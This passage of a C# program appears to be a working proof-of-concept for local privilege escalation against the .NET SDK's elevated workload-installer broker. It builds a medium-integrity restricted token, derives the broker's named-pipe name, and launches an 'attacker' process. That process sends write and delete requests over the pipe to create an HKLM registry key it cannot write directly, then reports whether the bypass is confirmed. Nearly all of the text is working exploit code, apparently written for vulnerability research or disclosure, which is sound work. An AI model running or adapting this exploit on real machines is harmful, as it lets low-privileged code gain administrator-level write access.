            Console.WriteLine("LOG_PIPE_CONNECTED_BY_NON_PARENT=True");
        }
        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
        {
            Console.WriteLine($"LOG_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
            return 3;
        }

        // The product logger calls WaitForPipeDrain after each message. Consume log
        // traffic so the elevated server can leave its constructor and dispatch requests.
        using var logDrainCts = new CancellationTokenSource();
        Task logDrain = Task.Run(() => DrainLogAsync(log, logDrainCts.Token));

        string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";

        string writeResponse = SendRequestSync(dispatch, new
        {
            WorkloadId = MarkerWorkload,
            RequestType = 400,
            SdkFeatureBand = FeatureBand,
        });
        Console.WriteLine($"WRITE_RESPONSE={writeResponse}");

        bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
        Console.WriteLine($"HKLM_MARKER_PATH={markerPath}");
        Console.WriteLine($"HKLM_MARKER_CREATED={created}");

        string deleteResponse = SendRequestSync(dispatch, new
        {
            WorkloadId = MarkerWorkload,
            RequestType = 401,
            SdkFeatureBand = FeatureBand,
        });
        Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");

        bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
        Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");

        string shutdownResponse = SendRequestSync(dispatch, new { RequestType = 0 });
        Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");

        logDrainCts.Cancel();
        try { log.Dispose(); } catch { }
        try { logDrain.Wait(TimeSpan.FromSeconds(2)); } catch { }

        string effectiveIntegritySid = GetEffectiveIntegritySid();
        bool privilegeBoundaryConfirmed =
            Environment.ProcessId != expectedParentPid &&
            !directWriteAllowed &&
            created &&
            cleaned;

        bool confirmed =
            privilegeBoundaryConfirmed &&
            (!requireMediumIntegrity || effectiveIntegritySid == "S-1-16-8192");

        Console.WriteLine($"ELEVATED_BROKER_PRIVILEGE_BYPASS={(privilegeBoundaryConfirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        Console.WriteLine($"ELEVATED_BROKER_MEDIUM_IL_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        return confirmed ? 0 : 1;
    }

    private static string SendRequestSync(NamedPipeClientStream pipe, object request)
    {
        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(request);
        byte[] header = BitConverter.GetBytes(payload.Length);
        byte[] framed = new byte[header.Length + payload.Length];
        Buffer.BlockCopy(header, 0, framed, 0, header.Length);
        Buffer.BlockCopy(payload, 0, framed, header.Length, payload.Length);

        pipe.Write(framed, 0, framed.Length);
        pipe.Flush();

        byte[] lengthBytes = new byte[4];
        ReadExactlySync(pipe, lengthBytes);
        int length = BitConverter.ToInt32(lengthBytes, 0);
        if (length < 0 || length > 2044)
        {
            throw new InvalidDataException($"Unexpected response length: {length}");
        }

        byte[] response = new byte[length];
        ReadExactlySync(pipe, response);
        return Encoding.UTF8.GetString(response);
    }

    private static void ReadExactlySync(Stream stream, byte[] buffer)
    {
        int read = 0;
        while (read < buffer.Length)
        {
            int n = stream.Read(buffer, read, buffer.Length - read);
            if (n == 0)
            {
                throw new EndOfStreamException();
            }
            read += n;
        }
    }

    private static IntPtr CreateMediumRestrictedImpersonationToken()
    {
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_IMPERSONATE = 0x0004;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        const uint TOKEN_ADJUST_SESSIONID = 0x0100;
        const uint DISABLE_MAX_PRIVILEGE = 0x00000001;
        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
        const uint SE_GROUP_INTEGRITY = 0x00000020;

        uint desired = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, desired, out IntPtr currentToken))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
        }

        IntPtr adminSidPtr = IntPtr.Zero;
        IntPtr mediumSidPtr = IntPtr.Zero;
        IntPtr tmlPtr = IntPtr.Zero;
        IntPtr restrictedPrimary = IntPtr.Zero;

        try
        {
            var adminSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            byte[] adminSidBytes = new byte[adminSid.BinaryLength];
            adminSid.GetBinaryForm(adminSidBytes, 0);
            adminSidPtr = Marshal.AllocHGlobal(adminSidBytes.Length);
            Marshal.Copy(adminSidBytes, 0, adminSidPtr, adminSidBytes.Length);

            var disable = new[]
            {
                new SID_AND_ATTRIBUTES
                {
                    Sid = adminSidPtr,
                    Attributes = SE_GROUP_USE_FOR_DENY_ONLY
                }
            };

            if (!CreateRestrictedToken(
                currentToken,
                DISABLE_MAX_PRIVILEGE,
                (uint)disable.Length,
                disable,
                0,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                out restrictedPrimary))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateRestrictedToken failed");
            }

            var mediumSid = new SecurityIdentifier("S-1-16-8192");
            byte[] mediumSidBytes = new byte[mediumSid.BinaryLength];
            mediumSid.GetBinaryForm(mediumSidBytes, 0);
            mediumSidPtr = Marshal.AllocHGlobal(mediumSidBytes.Length);
            Marshal.Copy(mediumSidBytes, 0, mediumSidPtr, mediumSidBytes.Length);

            var tml = new TOKEN_MANDATORY_LABEL
            {
                Label = new SID_AND_ATTRIBUTES
                {
                    Sid = mediumSidPtr,
                    Attributes = SE_GROUP_INTEGRITY
                }
            };
            tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>());
            Marshal.StructureToPtr(tml, tmlPtr, false);

            if (!SetTokenInformation(
                restrictedPrimary,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                tmlPtr,
                Marshal.SizeOf<TOKEN_MANDATORY_LABEL>() + mediumSidBytes.Length))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation(TokenIntegrityLevel) failed");
            }

            const uint MAXIMUM_ALLOWED = 0x02000000;
            if (!DuplicateTokenEx(
                restrictedPrimary,
                MAXIMUM_ALLOWED,
                IntPtr.Zero,
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                TOKEN_TYPE.TokenImpersonation,
                out IntPtr impersonationToken))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "DuplicateTokenEx failed");
            }

            return impersonationToken;
        }
        finally
        {
            if (restrictedPrimary != IntPtr.Zero) CloseHandle(restrictedPrimary);
            if (currentToken != IntPtr.Zero) CloseHandle(currentToken);
            if (tmlPtr != IntPtr.Zero) Marshal.FreeHGlobal(tmlPtr);
            if (mediumSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(mediumSidPtr);
            if (adminSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(adminSidPtr);
        }
    }

    private static string GetEffectiveIntegritySid()
    {
        const uint TOKEN_QUERY = 0x0008;
        IntPtr token;
        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, out token))
        {
            int error = Marshal.GetLastWin32Error();
            const int ERROR_NO_TOKEN = 1008;
            if (error != ERROR_NO_TOKEN || !OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out token))
            {
                throw new System.ComponentModel.Win32Exception(error, "Unable to open effective token");
            }
        }

        try
        {
            _ = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out int length);
            int error = Marshal.GetLastWin32Error();
            if (length <= 0)
            {
                throw new System.ComponentModel.Win32Exception(error);
            }

            IntPtr buffer = Marshal.AllocHGlobal(length);
            try
            {
                if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, buffer, length, out _))
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }

                TOKEN_MANDATORY_LABEL label = Marshal.PtrToStructure<TOKEN_MANDATORY_LABEL>(buffer);
                return new SecurityIdentifier(label.Label.Sid).Value;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
        finally
        {
            CloseHandle(token);
        }
    }

    private static string CreatePipeName(int processId, int sdkMajor, params string[] values)
    {
        string processPath = (Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.")).ToLowerInvariant();

        string mac = GetMacAddress()
            ?? throw new InvalidOperationException("No usable MAC address found.");

        string hashedMac = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(mac)));
        string name = $"{processId};{processPath};{hashedMac};{string.Join(";", values)}";
        return sdkMajor >= 10 ? CreateUuidV8(name).ToString("B") : CreateUuidV5(name).ToString("B");
    }

    private static string GetSelectedSdkVersion(string dotnet)
    {
        var psi = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = "--version",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        using Process p = Process.Start(psi) ?? throw new InvalidOperationException("Failed to query selected SDK version.");
        string stdout = p.StandardOutput.ReadToEnd().Trim();
        string stderr = p.StandardError.ReadToEnd();
        p.WaitForExit();
        if (p.ExitCode != 0 || string.IsNullOrWhiteSpace(stdout))
        {
            throw new InvalidOperationException($"dotnet --version failed: {stderr}");
        }
        return stdout.Split(new[] {'\r','\n'}, StringSplitOptions.RemoveEmptyEntries)[0].Trim();
    }

    private static string? GetMacAddress()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(nic => nic.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                          nic.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
            .Select(nic => nic.GetPhysicalAddress().GetAddressBytes())
            .Where(bytes => bytes.Length == 6 && bytes.Any(b => b != 0))
            .Select(bytes => string.Join("-", bytes.Select(b => b.ToString("X2"))))
            .FirstOrDefault();
    }

    private static Guid CreateUuidV5(string name)
    {
        Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
        byte[] nameBytes = Encoding.UTF8.GetBytes(name);
        byte[] namespaceBytes = namespaceId.ToByteArray();

        SwapGuidByteOrder(namespaceBytes);

        byte[] streamToHash = new byte[namespaceBytes.Length + nameBytes.Length];
        Array.Copy(namespaceBytes, streamToHash, namespaceBytes.Length);
        Array.Copy(nameBytes, 0, streamToHash, namespaceBytes.Length, nameBytes.Length);

        using SHA1 sha1 = SHA1.Create();
        byte[] hashResult = sha1.ComputeHash(streamToHash);
        byte[] result = new byte[16];
        Array.Copy(hashResult, result, result.Length);

        result[6] = (byte)(0x50 | (result[6] & 0x0F));
        result[8] = (byte)(0x40 | (result[8] & 0x3F));
        SwapGuidByteOrder(result);

        return new Guid(result);
    }

    private static Guid CreateUuidV8(string name)
    {
        Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
        byte[] nameBytes = Encoding.UTF8.GetBytes(name);
        byte[] namespaceBytes = namespaceId.ToByteArray();

        SwapGuidByteOrder(namespaceBytes);

        byte[] streamToHash = new byte[namespaceBytes.Length + nameBytes.Length];
        Array.Copy(namespaceBytes, streamToHash, namespaceBytes.Length);
        Array.Copy(nameBytes, 0, streamToHash, namespaceBytes.Length, nameBytes.Length);

        byte[] hashResult = XxHash128.Hash(streamToHash);
        byte[] result = new byte[16];
        Array.Copy(hashResult, result, result.Length);

        result[6] = (byte)(0x80 | (result[6] & 0x0F));
        result[8] = (byte)(0x40 | (result[8] & 0x3F));
        SwapGuidByteOrder(result);

        return new Guid(result);
    }

    private static void SwapGuidByteOrder(byte[] b)
    {
        Swap(b, 0, 3);
        Swap(b, 1, 2);
        Swap(b, 5, 6);
        Swap(b, 7, 8);
    }

    private static void Swap(byte[] b, int x, int y)
        => (b[x], b[y]) = (b[y], b[x]);
    private static async Task<int> LaunchMediumIntegrityAttackerAsync(
        string dotnet,
        string dll,
        int serverPid,
        int expectedParentPid,
        string evidencePath,
        int sdkMajor)
    {
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        const uint TOKEN_ADJUST_SESSIONID = 0x0100;
        const uint DISABLE_MAX_PRIVILEGE = 0x00000001;
        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
        const uint SE_GROUP_INTEGRITY = 0x00000020;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint LOGON_WITH_PROFILE = 0x00000001;

        uint desired = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, desired, out IntPtr currentToken))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
        }

        IntPtr adminSidPtr = IntPtr.Zero;
        IntPtr mediumSidPtr = IntPtr.Zero;
        IntPtr tmlPtr = IntPtr.Zero;
        IntPtr restrictedToken = IntPtr.Zero;

        try
        {
            var adminSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            byte[] adminSidBytes = new byte[adminSid.BinaryLength];
            adminSid.GetBinaryForm(adminSidBytes, 0);
            adminSidPtr = Marshal.AllocHGlobal(adminSidBytes.Length);
            Marshal.Copy(adminSidBytes, 0, adminSidPtr, adminSidBytes.Length);

            var disable = new[]
            {
                new SID_AND_ATTRIBUTES
                {
                    Sid = adminSidPtr,
                    Attributes = SE_GROUP_USE_FOR_DENY_ONLY
                }
            };

            if (!CreateRestrictedToken(
                currentToken,
                DISABLE_MAX_PRIVILEGE,
                (uint)disable.Length,
                disable,
                0,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                out restrictedToken))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateRestrictedToken failed");
            }

            var mediumSid = new SecurityIdentifier("S-1-16-8192");
            byte[] mediumSidBytes = new byte[mediumSid.BinaryLength];
            mediumSid.GetBinaryForm(mediumSidBytes, 0);
            mediumSidPtr = Marshal.AllocHGlobal(mediumSidBytes.Length);
            Marshal.Copy(mediumSidBytes, 0, mediumSidPtr, mediumSidBytes.Length);

            var tml = new TOKEN_MANDATORY_LABEL
            {
                Label = new SID_AND_ATTRIBUTES
                {
                    Sid = mediumSidPtr,
                    Attributes = SE_GROUP_INTEGRITY
                }
            };
            tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>());
            Marshal.StructureToPtr(tml, tmlPtr, false);

            if (!SetTokenInformation(
                restrictedToken,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                tmlPtr,
                Marshal.SizeOf<TOKEN_MANDATORY_LABEL>() + mediumSidBytes.Length))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation(TokenIntegrityLevel) failed");
            }

            string args = $"\"{dll}\" attacker {serverPid} {expectedParentPid} \"{evidencePath}\" {sdkMajor}";
            var commandLine = new StringBuilder($"\"{dotnet}\" {args}");
            STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };

            if (!CreateProcessWithTokenW(
                restrictedToken,
                LOGON_WITH_PROFILE,
                dotnet,
                commandLine,
                CREATE_NO_WINDOW,
                IntPtr.Zero,
                Path.GetDirectoryName(dll),
                ref si,
                out PROCESS_INFORMATION pi))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessWithTokenW failed");
            }

            try
            {
                using Process child = Process.GetProcessById((int)pi.dwProcessId);
                Task exited = child.WaitForExitAsync();
                if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(25))) != exited)
                {
                    Console.WriteLine($"MEDIUM_ATTACKER_TIMEOUT_PID={child.Id}");
                    try { child.Kill(entireProcessTree: true); } catch { }
                    try { await child.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5)); } catch { }
                    return 124;
                }

                return child.ExitCode;
            }
            finally
            {
                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            }
        }
        finally
        {
            if (restrictedToken != IntPtr.Zero) CloseHandle(restrictedToken);
            if (currentToken != IntPtr.Zero) CloseHandle(currentToken);
            if (tmlPtr != IntPtr.Zero) Marshal.FreeHGlobal(tmlPtr);
            if (mediumSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(mediumSidPtr);
            if (adminSidPtr != IntPtr.Zero) Marshal.FreeHGlobal(adminSidPtr);
        }
    }

    private static string GetCurrentIntegritySid()
    {
        const uint TOKEN_QUERY = 0x0008;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out IntPtr token))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }

        try
        {
            _ = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out int length);
            int error = Marshal.GetLastWin32Error();
            if (length <= 0)
            {
                throw new System.ComponentModel.Win32Exception(error);
            }

            IntPtr buffer = Marshal.AllocHGlobal(length);
            try
            {
                if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, buffer, length, out _))
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }

                TOKEN_MANDATORY_LABEL label = Marshal.PtrToStructure<TOKEN_MANDATORY_LABEL>(buffer);
                return new SecurityIdentifier(label.Label.Sid).Value;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
        finally
        {
            CloseHandle(token);
        }
    }

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenIntegrityLevel = 25
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string? lpReserved;
        public string? lpDesktop;
        public string? lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateRestrictedToken(
        IntPtr ExistingTokenHandle,
        uint Flags,
        uint DisableSidCount,
        [In] SID_AND_ATTRIBUTES[] SidsToDisable,
        uint DeletePrivilegeCount,
        IntPtr PrivilegesToDelete,
        uint RestrictedSidCount,
        IntPtr SidsToRestrict,
        out IntPtr NewTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string? lpApplicationName,
        StringBuilder lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string? lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);


    private enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    private enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        uint DesiredAccess,
        [MarshalAs(UnmanagedType.Bool)] bool OpenAsSelf,
        out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const int OtsLogon32LogonInteractive = 2;
    private const int OtsLogon32ProviderDefault = 0;
    private const uint OtsProcessCreateProcess = 0x0080;
    private const uint OtsProcessQueryLimitedInformation = 0x1000;
    private const uint OtsExtendedStartupInfoPresent = 0x00080000;
    private const uint OtsCreateNoWindow = 0x08000000;
    private const uint OtsLogonWithProfile = 0x00000001;
    private const nuint OtsProcThreadAttributeParentProcess = 0x00020000;

    [StructLayout(LayoutKind.Sequential)]
    private struct OTS_STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUserW(string lpszUsername, string? lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "InitializeProcThreadAttributeList")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OtsInitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref nuint lpSize);

    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "UpdateProcThreadAttribute")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OtsUpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, nuint cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", EntryPoint = "DeleteProcThreadAttributeList")]
    private static extern void OtsDeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode, EntryPoint = "CreateProcessW")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OtsCreateProcessW(string? lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref OTS_STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "TerminateProcess")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OtsTerminateProcess(IntPtr hProcess, uint uExitCode);
}
